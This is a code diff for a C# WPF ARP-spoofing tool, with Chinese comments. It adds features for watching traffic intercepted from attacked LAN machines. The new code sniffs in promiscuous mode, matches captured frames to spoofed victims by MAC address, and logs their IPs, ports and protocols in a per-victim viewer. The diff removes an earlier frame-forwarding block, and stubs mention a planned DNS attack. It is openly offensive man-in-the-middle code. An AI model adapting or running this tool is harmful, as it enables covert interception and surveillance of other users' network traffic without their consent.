@@ -1,7 +1,6 @@
 ﻿using CommunityToolkit.Mvvm.ComponentModel;
 using CommunityToolkit.Mvvm.Input;
 using PacketDotNet;
-using PacketDotNet.Ieee80211;
 using SharpPcap;
 using SharpPcap.LibPcap;
 using System;
@@ -175,7 +174,7 @@ namespace ARPSpoofing
         public RelayCommand StopScanCommand { get; set; }
         public RelayCommand CallTargetComputerCommand { get; set; } //攻击目标主机
         public RelayCommand StopCallTargetComputerCommand { get; set; }
-
+        public RelayCommand WatchDetailCommand { get; set; }
         public MainWindowViewModel()
         {
             IsScanning = false;
@@ -186,6 +185,7 @@ namespace ARPSpoofing
             StopScanCommand = new RelayCommand(StopScan);
             CallTargetComputerCommand = new RelayCommand(CallTargetComputer);
             StopCallTargetComputerCommand = new RelayCommand(StopCallTargetComputer);
+            WatchDetailCommand = new RelayCommand(WatchDetail);
             _cancellationTokenSource = new CancellationTokenSource();
             ArpAttackComputers = new ObservableCollection<ArpAttackComputer>();
         }
@@ -200,7 +200,7 @@ namespace ARPSpoofing
             {
                 LibPcapLiveDevice = null;
                 MessageBox.Show("网卡数量不足", "错误", MessageBoxButton.OK, MessageBoxImage.Error);
-                return; 
+                return;
             }
 
             LibPcapLiveDevice = LibPcapLiveDevices.FirstOrDefault();
@@ -243,7 +243,7 @@ namespace ARPSpoofing
 
             var gw = LibPcapLiveDevice.Interface.GatewayAddresses; // 网关IP
             //ipv4的gateway
-            GatewayIp = gw?.FirstOrDefault(x => x.AddressFamily == AddressFamily.InterNetwork);
+            GatewayIp = gw?.FirstOrDefault(x => x.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
             if (GatewayIp == null)
                 return;
 
@@ -252,33 +252,87 @@ namespace ARPSpoofing
             GatewayMac = Resolve(GatewayIp);
         }
 
+        private void WatchDetail() 
+        {
+            var targets = ArpAttackComputers.Where(x => x.IsSelected).ToList();
+            foreach (var item in targets)
+            {
+                DetailViewModel detailViewModel = new DetailViewModel();
+                detailViewModel.ArpAttackComputer = item;
+
+                Detail detail = new Detail(detailViewModel);
+
+                detail.Show();
+            }
+        }
+
+        /// <summary>
+        /// 监听到攻击的网卡收到的数据包
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void OnPacketArrival(object sender, PacketCapture e)
         {
-            var device = sender as LibPcapLiveDevice;
-            var packet = Packet.ParsePacket(e.Device.LinkType, e.Data.ToArray());
-            if (packet != null)
+            try
             {
-                if (packet is EthernetPacket ethernetPacket)
+                var device = sender as LibPcapLiveDevice;
+                var packet = Packet.ParsePacket(e.Device.LinkType, e.Data.ToArray());
+                if (packet != null)
                 {
-                    IPPacket ipPacket = ethernetPacket.Extract<IPPacket>();
-                    if (ipPacket == null) return;
-                    if (ipPacket.SourceAddress.ToString() == "192.168.1.2")
+                    if (packet is EthernetPacket ethernetPacket) //数据包是以太网数据
                     {
-                        //var tempTcpPacket = new TcpPacket(outerTcpPacket.SourcePort, outerTcpPacket.DestinationPort);
-                        //tempTcpPacket.PayloadData = outerTcpPacket.PayloadData;
+                        var targetComputer = ArpAttackComputers.FirstOrDefault(x => x.MacAddress == ethernetPacket.SourceHardwareAddress.ToString());
 
-                        //IPv4Packet tempIpV4Packet = new IPv4Packet(outerIpPacket.SourceAddress, outerIpPacket.DestinationAddress);
-                        ////ipPacket.Version = 4;
-                        //tempIpV4Packet.HeaderLength = (byte)(IPv4Fields.HeaderLength + (tempTcpPacket.Options.Count() * 1));
-                        ////ipPacket.typ = 0;
-                        //tempIpV4Packet.TotalLength = (ushort)(tempIpV4Packet.HeaderLength + tempTcpPacket.Bytes.Length);
-                        //tempIpV4Packet.TimeToLive = 128;
-                        //tempIpV4Packet.Protocol = PacketDotNet.ProtocolType.Tcp;
-                        //tempIpV4Packet.PayloadPacket = tempTcpPacket;
-                        ethernetPacket.DestinationHardwareAddress = GatewayMac;
-                        device.SendPacket(ethernetPacket);
+                        if (targetComputer != null)
+                        {
+                            var ipPacket = ethernetPacket.Extract<IPPacket>();
+                            if (ipPacket != null)
+                            {
+                                var packetViewModel = new PacketViewModel();
+                                packetViewModel.SourceIpAddress = ipPacket.SourceAddress.ToString();
+                                packetViewModel.TargetIpAddress = ipPacket.DestinationAddress.ToString();
+
+                                var udpPacket = ipPacket.Extract<UdpPacket>();
+                                var tcpPacket = ipPacket.Extract<TcpPacket>();
+                                packetViewModel.Type = "IP";
+                                //try
+                                //{
+                                //    CancellationTokenSource cts = new CancellationTokenSource();
+                                //    cts.CancelAfter(500);
+                                //    IPHostEntry hostEntry = Dns.GetHostEntryAsync(packetViewModel.TargetIpAddress, cts.Token).ConfigureAwait(false).GetAwaiter().GetResult();
+                                //    packetViewModel.Domain = hostEntry.Aliases == null ? null : hostEntry.Aliases.FirstOrDefault();
+                                //}
+                                //catch (Exception) { }
+
+                                if (udpPacket != null)
+                                {
+                                    packetViewModel.SourcePort = udpPacket.SourcePort;
+                                    packetViewModel.TargetPort = udpPacket.DestinationPort;
+                                    packetViewModel.Type = "UDP";
+                                }
+
+                                if (tcpPacket != null)
+                                {
+                                    packetViewModel.SourcePort = tcpPacket.SourcePort;
+                                    packetViewModel.TargetPort = tcpPacket.DestinationPort;
+                                    packetViewModel.Type = "TCP";
+                                }
+
+                                targetComputer.AddPacket(packetViewModel);
+                            }
+                            else
+                            {
+                                ///mac地址没啥好记录的都知道了
+                                var packetViewModel = new PacketViewModel();
+                                packetViewModel.Type = "以太网";
+                                targetComputer.AddPacket(packetViewModel);
+                            }
+                        }
                     }
                 }
+            }
+            catch (Exception) 
+            {
             }
         }
 
@@ -487,7 +541,7 @@ namespace ARPSpoofing
                 LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
                 LibPcapLiveDevice.Filter = "ether dst " + LocalMac.ToString();
                 LibPcapLiveDevice.StartCapture();
-            
+
             }
             foreach (var compute in target)
             {
@@ -601,7 +655,7 @@ namespace ARPSpoofing
         public Task ArpAttackTask { get; set; }
         public Task DnsAttackTask { get; set; } //todo define dns attack
         public CancellationTokenSource CancellationTokenSource { get; set; }
-
+        public ObservableCollection<PacketViewModel> Packets { get; set; }
         private double _value;
         public double Value
         {
@@ -612,6 +666,7 @@ namespace ARPSpoofing
         public ArpAttackComputer()
         {
             CancellationTokenSource = new CancellationTokenSource();
+            Packets = new ObservableCollection<PacketViewModel>();
             Task.Run(async () =>
             {
                 while (true)
@@ -630,6 +685,23 @@ namespace ARPSpoofing
             });
         }
 
+        private object _lock = new object();
+        public void AddPacket(PacketViewModel packetViewModel)
+        {
+            lock (_lock)
+            {
+                Application.Current.Dispatcher.Invoke(() =>
+                {
+                    if (Packets.Count >= 512)
+                    {
+                        Packets.RemoveAt(0);
+                    }
+
+                    Packets.Add(packetViewModel);
+                });
+            }
+        }
+
         /// <summary>
         /// 发送arp诈骗
         /// </summary>
@@ -642,5 +714,24 @@ namespace ARPSpoofing
         {
             CancellationTokenSource?.Cancel();
         }
+    }
+
+    /// <summary>
+    /// 被arp欺骗的电脑数据包
+    /// </summary>
+    public class PacketViewModel : ObservableObject
+    {
+        /// <summary>
+        /// 网络层
+        /// </summary>
+        public string SourceIpAddress { get; set; }
+        public string TargetIpAddress { get; set; }
+        /// <summary>
+        /// 传输层
+        /// </summary>
+        public ushort SourcePort { get; set; }
+        public ushort TargetPort { get; set; }
+        public string Type { get; set; }
+        public string Domain { get; set; }
     }
 }
